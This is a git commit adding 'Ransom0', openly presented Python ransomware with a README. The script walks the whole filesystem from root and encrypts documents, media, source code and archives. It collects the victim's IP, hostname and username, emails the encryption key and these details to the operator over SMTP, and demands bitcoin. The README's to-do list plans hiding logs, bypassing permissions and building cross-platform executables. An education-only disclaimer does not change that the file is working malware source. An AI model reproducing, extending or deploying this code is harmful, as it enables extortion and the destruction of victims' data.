14e2429c2eff8bc86a55eb0a83c9d969f2862433
Hugo LB <66400773+HugoLB0@users.noreply.github.com>
2020-07-28 14:29:29 +0800

    Add files via upload

---
+++ README.md
@@ -0,0 +1,48 @@
+## Ransom0
+Ransom0 is a open source ransomware made with Python, designed to find and encrypt user data. Instead of a real server, the encryption key will be send via email to your mail box.
+
+![Message displayed when user files are encrypted](https://hugolb0.000webhostapp.com/ransom0.png)
+
+## Program Structure:
+the program is organised  in **three main part**:
+
+ - **Find Files:** find files by extensions and store the path into **path.txt**
+ - **Encrypt Files:** encrypt files in **path.txt**, generate **digits id**, **send key and id**
+ - **Decrypt:** ask for money, wait for the key, and decrypt file if key is correct
+
+
+## How to run
+You need to have python3 installed and configured
+
+ - Download the repository via git or zip
+ - Install requirements: `pip install -r requirements.txt`
+
+Before running it, you need to modify a few thing:
+
+ 1. Add your email information: ![enter image description here](https://hugolb0.000webhostapp.com/ransom0_email.png)
+
+ 
+
+ 1. I recommend running it in a testing directory, otherwise all of your file will be encrypted: ![enter image description here](https://hugolb0.000webhostapp.com/ransom0_directory.png)
+
+3. Run it: `python ransom0.py`
+
+## To do:
+ - [x] Add logs
+ - [ ] Hide logs
+ - [ ] Bypass Permission 
+ - [ ] Automatically  show the message on startup
+ - [ ] Message in a GUI windows ?
+ - [ ] Generate executable from .py file for ALL operating system
+ - [ ] Store email credential in files ?
+
+
+## Testing
+This Program have been test on:
+
+ - **Windows 10**
+ - **Mac OS Catalina 10.15.6 (19G73)**
+
+## DISCLAMER 
+**THIS PROJECT IS FOR EDUCATION PURPOSE ONLY, DO NOT RUN IT WITHOUT PERMISSION!**
+**I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSE BY THE ILLEGAL USAGE OF THIS PROGRAM**
---
+++ ransom0.py
@@ -0,0 +1,214 @@
+import os, platform, random, smtplib, ssl, socket, shutil, subprocess
+from os import system, name
+from requests import get
+from datetime import datetime
+from progress.bar import Bar
+from progress.spinner import Spinner
+from cryptography.fernet import Fernet
+
+
+key = Fernet.generate_key()
+username = os.getlogin()
+digits = random.randint(1111,9999) 
+time_now = datetime.now().time()
+hostname = socket.gethostname()
+IP = get('https://api.ipify.org').text
+PATH = os.getcwd()
+
+# Email Settings
+port = 587  
+smtp_server = "" # Enter the smtp server of your email provider
+sender_email = ""  # Enter your address
+receiver_email = ""  # Enter receiver address
+password = "" # your email password
+
+extensions = (
+        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
+        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
+        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
+
+        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
+        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
+        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
+        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
+        
+        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
+        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
+        '.java', '.class', '.jar', # java source code
+        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
+        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
+        '.go', '.py', '.pyc', '.bf', '.coffee', # other source code files
+
+        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
+    )
+
+# Text to display
+RANSOM_TEXT = """
+To get the decryption key, please send 50$ in bitcoin to BITCOIN ADRESS 
+And send proof of transfer, your id and your name to  EMAIL ADRESS
+"""
+
+#Clear Screen Function
+def clear(): 
+    if name == 'nt': 
+        _ = system('cls') 
+
+    else: 
+        _ = system('clear') 
+
+
+
+def DISPLAY():
+    print("""
+    ____                                  ___  
+    |  _ \ __ _ _ __  ___  ___  _ __ ___  / _ \ 
+    | |_) / _` | '_ \/ __|/ _ \| '_ ` _ \| | | |
+    |  _ < (_| | | | \__ \ (_) | | | | | | |_| |
+    |_| \_\__,_|_| |_|___/\___/|_| |_| |_|\___/ 
+                                                
+    """)
+    print("Time: {}".format(time_now))
+    print("IP Adress: {}".format(IP))
+    print("Platform: {}".format(platform.system()))
+    print("Hostname: {}".format(hostname))
+    print("User: {}".format(username))
+    print("ID: {}".format(str(digits)))
+    print()
+
+
+
+def FindFiles():
+    load_state = 0
+    spinner = Spinner('Finding Files ')
+    while load_state != 'FINISHED':
+        f = open("logs/path.txt", "a")
+        cnt = 0
+        for root, files in os.walk("/"):
+        # for root, files in os.walk("/YOUR/TESTING/DIRECTORY"):   
+            for file in files:
+                if file.endswith(extensions):
+                        cnt += 1
+                        TARGET = os.path.join(root, file)
+                        f.write(TARGET+'\n')
+                        spinner.next()
+        f.close()
+        load_state = 'FINISHED'
+
+    print()
+    print("Found {} target files".format(cnt))
+    print()
+    f = open("logs/cnt.txt", "w")
+    f.write(str(cnt))
+    f.close()
+
+
+
+def encrypt(filename):
+    f = Fernet(key)
+    with open(filename, "rb") as file:
+        file_data = file.read()
+    encrypted_data = f.encrypt(file_data)
+    with open(filename, "wb") as file:
+        file.write(encrypted_data)
+
+
+def StartRansom():
+    DISPLAY()
+    FindFiles()
+    f = open("logs/cnt.txt", "r")
+    cnt = f.read()
+    f.close()
+    with Bar('Encrypting', max=int(cnt)) as bar:
+        filepath = 'logs/path.txt'
+        with open(filepath) as fp:
+            line = fp.readline()
+            while line:
+                filename = line.strip()
+                try:
+                    encrypt(filename)
+                except Exception:
+                    print("!Permission denied")
+                    pass
+                line = fp.readline()
+                bar.next()
+    fp.close()
+    print()
+    SendData()
+    clear()
+    DecyptMessage(False)
+
+def decrypt(filename):
+    f = open("logs/key_data.txt", "r")
+    key = f.read()
+    f.close()
+    f = Fernet(key)
+    with open(filename, "rb") as file:
+        encrypted_data = file.read()
+    decrypted_data = f.decrypt(encrypted_data)
+    with open(filename, "wb") as file:
+        file.write(decrypted_data)
+
+
+def DecyptMessage(INVALID_KEY):
+    clear()
+    DISPLAY()
+    if INVALID_KEY == True:
+        print("Invalid Key !")
+    else: 
+        pass
+    print(RANSOM_TEXT)
+    key_data = input('key: ')
+    f = open("logs/key_data.txt", "w")
+    f.write(key_data)
+    f.close()
+    with open('logs/path.txt') as fp:
+        line = fp.readline()
+        while line:
+            filename = line.strip()
+            try:
+                decrypt(filename)
+            except PermissionError:
+                print("!Permission Denied")
+                pass
+            except Exception:
+                DecyptMessage(True)
+            line = fp.readline()
+    print("Your file have been decrypted")
+    fp.close()
+    shutil.rmtree(PATH+'/logs', ignore_errors=True)
+    exit()
+
+
+
+def SendData():
+    DataSend = ("""
+    time: {}
+    IP: {}
+    Hostname: {}
+    username: {}
+    id: {}
+    key: {}
+    """).format(time_now, IP, hostname, username, str(digits), str(key))
+    print("Sending Data")
+    context = ssl.create_default_context()
+    with smtplib.SMTP(smtp_server, port) as server:
+        server.ehlo()  # Can be omitted
+        server.starttls(context=context)
+        server.ehlo()  # Can be omitted
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, DataSend)
+
+if __name__ == '__main__':
+    # Generate digits ID or read generated value from digits.txt
+    if os.path.isfile("logs/digits.txt") == True:
+        f = open("logs/digits.txt", "r")
+        digits = f.read()
+        f.close()
+        DecyptMessage(False)
+    else:
+        os.mkdir("logs")
+        f = open("logs/digits.txt", "w")
+        f.write(str(digits))
+        f.close()
+        StartRansom()
